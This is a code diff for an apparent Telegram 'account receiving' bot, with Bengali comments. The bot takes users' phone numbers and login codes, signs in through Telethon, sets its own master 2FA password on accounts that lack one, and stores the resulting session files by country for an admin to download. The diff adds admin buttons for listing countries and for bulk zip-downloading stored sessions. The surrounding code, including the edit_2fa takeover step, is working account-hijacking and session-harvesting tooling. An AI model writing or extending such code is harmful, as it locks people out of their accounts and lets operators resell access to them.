@@ -339,13 +339,28 @@ def admin_panel_command(message):
     if message.from_user.id != ADMIN_ID: return
     settings = load_settings()
     markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country"))
-    markup.add(types.InlineKeyboardButton("❌ Delete/Remove Country", callback_data="pnl_del_country"), types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"))
-    markup.add(types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
+    
+    # বোতামগুলো সাজানো হলো
+    markup.add(
+        types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), 
+        types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🌍 View Allowed Countries", callback_data="pnl_view_allowed"), # 🌍 নতুন বোতাম
+        types.InlineKeyboardButton("❌ Delete/Remove Country", callback_data="pnl_del_country")
+    )
+    markup.add(
+        types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"),
+        types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
+    )
     
     trash_cnt = get_trash_file_count()
     markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
-    markup.add(types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash"))
+    # 📥 অল ট্র্যাশ ফাইল ডাউনলোডের নতুন বোতাম
+    markup.add(
+        types.InlineKeyboardButton("📥 Download All Trash Files", callback_data="pnl_download_all_trash"),
+        types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash")
+    )
     
     panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored (As Bin Storage)."
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
@@ -353,11 +368,15 @@ def admin_panel_command(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
 def handle_admin_callbacks(call):
     if call.from_user.id != ADMIN_ID: return
+    settings = load_settings()
+    
     if call.data == "pnl_close":
         bot.delete_message(call.message.chat.id, call.message.message_id)
+        
     elif call.data == "pnl_pass":
         bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
         admin_state[call.from_user.id] = "wait_pass"
+        
     elif call.data == "pnl_set_country":
         bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime` \n\nExample: `880=0.15=50=600`")
         admin_state[call.from_user.id] = "wait_country_all"
@@ -365,6 +384,18 @@ def handle_admin_callbacks(call):
     elif call.data == "pnl_del_country":
         bot.send_message(call.message.chat.id, "❌ **Enter the Country Code you want to delete:**\n\nExample: `880` or `52` (Don't use + sign)")
         admin_state[call.from_user.id] = "wait_delete_country"
+        
+    elif call.data == "pnl_view_allowed": # 🌍 এলাউড কান্ট্রি লিস্ট ভিউ লজিক
+        response = "📋 **Allowed Countries Details:**\n\n"
+        for code in settings["country_prices"]:
+            prc = settings["country_prices"][code]
+            cap = settings["country_capacity"].get(code, 999)
+            delay = settings.get("country_delays", {}).get(code, 60)
+            response += f"• 🌍 **+{code}** ➜ Price: ${prc} | Cap: {cap} | Delay: {delay}s\n"
+        
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, reply_markup=markup)
     
     elif call.data == "pnl_view_trash":
         if not os.path.exists(TRASH_STORAGE_DIR):
@@ -381,6 +412,39 @@ def handle_admin_callbacks(call):
         bot.send_message(call.message.chat.id, list_msg)
         bot.answer_callback_query(call.id)
         
+    elif call.data == "pnl_download_all_trash": # 📥 অল ট্র্যাশ ফাইল ডাউনলোডের লজিক
+        if not os.path.exists(TRASH_STORAGE_DIR):
+            bot.answer_callback_query(call.id, "Trash directory does not exist!", show_alert=True)
+            return
+        all_trash_files = os.listdir(TRASH_STORAGE_DIR)
+        if not all_trash_files:
+            bot.answer_callback_query(call.id, "❌ Bin is empty! No files to download.", show_alert=True)
+            return
+            
+        bot.answer_callback_query(call.id, "⏳ Packing all trash files... Please wait.", show_alert=False)
+        zip_filename = "All_Trash_Sessions.zip"
+        try:
+            with zipfile.ZipFile(zip_filename, 'w') as zipf:
+                for file in all_trash_files:
+                    file_path = os.path.join(TRASH_STORAGE_DIR, file)
+                    if os.path.isfile(file_path):
+                        zipf.write(file_path, arcname=file)
+            
+            with open(zip_filename, 'rb') as doc:
+                bot.send_document(call.message.chat.id, doc, caption=f"📦 Total Trash Backup Downloaded Successfully!")
+            
+            os.remove(zip_filename)
+            # ডাউনলোড হয়ে গেলে অল ট্র্যাশ রিমুভ করে দেওয়া হবে স্বয়ংক্রিয়ভাবে
+            for file in all_trash_files:
+                try: os.remove(os.path.join(TRASH_STORAGE_DIR, file))
+                except: pass
+                
+            bot.send_message(call.message.chat.id, "💥 **Downloaded & Auto-Cleared Trash Area successfully!**")
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            admin_panel_command(call.message)
+        except Exception as e:
+            bot.send_message(call.message.chat.id, f"❌ Trash Download Error: {e}")
+        
     elif call.data == "pnl_clear_trash":
         try:
             for file in os.listdir(TRASH_STORAGE_DIR):
@@ -392,7 +456,6 @@ def handle_admin_callbacks(call):
         admin_panel_command(call.message)
         
     elif call.data == "pnl_all_files":
-        settings = load_settings()
         file_msg = "📂 *Live Country Session Files Count:*\n\n"
         markup = types.InlineKeyboardMarkup(row_width=1)
         for code in settings["country_prices"]:
@@ -402,10 +465,12 @@ def handle_admin_callbacks(call):
                 markup.add(types.InlineKeyboardButton(f"📥 Download from +{code} ({count} Pcs)", callback_data=f"pnl_askamt_{code}"))
         markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
+        
     elif call.data.startswith("pnl_askamt_"):
         code = call.data.replace("pnl_askamt_", "")
         bot.send_message(call.message.chat.id, f"✏️ **Enter how many sessions you want to download for +{code}:**")
         admin_state[call.from_user.id] = f"wait_amt_{code}"
+        
     elif call.data == "pnl_back":
         bot.delete_message(call.message.chat.id, call.message.message_id)
         admin_panel_command(call.message)
@@ -555,11 +620,7 @@ async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
     
     try:
-        # ওটিপি সাবমিট করে সাইন ইন করার চেষ্টা
         await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
-        
-        # 🔒 যদি সাইন ইন সফল হয়, তার মানে একাউন্টে কোনো পাসওয়ার্ড (2FA) ছিল না। 
-        # এখন বট নিজের মাস্টার পাসওয়ার্ড সেট করে ব্যাকআপ প্রসেসে পাঠিয়ে দেবে।
         settings = load_settings()
         try:
             await data["client"].edit_2fa(new_password=settings["security_password"])
@@ -569,7 +630,6 @@ async def verify_otp_task(text, user_id, message):
         del user_data[user_id]
         
     except SessionPasswordNeededError:
-        # ❌ যদি একাউন্টে টু-স্টেপ পাসওয়ার্ড অন থাকে, তাহলে সরাসরি রিজেক্ট হবে
         bot.reply_to(message, "❌ **This account cannot be received!**\n\n২ স্টেপ ভেরিফিকেশন (Two-Step Verification) একটিভ থাকার কারণে অ্যাকাউন্টটি নেওয়া সম্ভব হচ্ছে না।")
         try:
             await data["client"].disconnect()
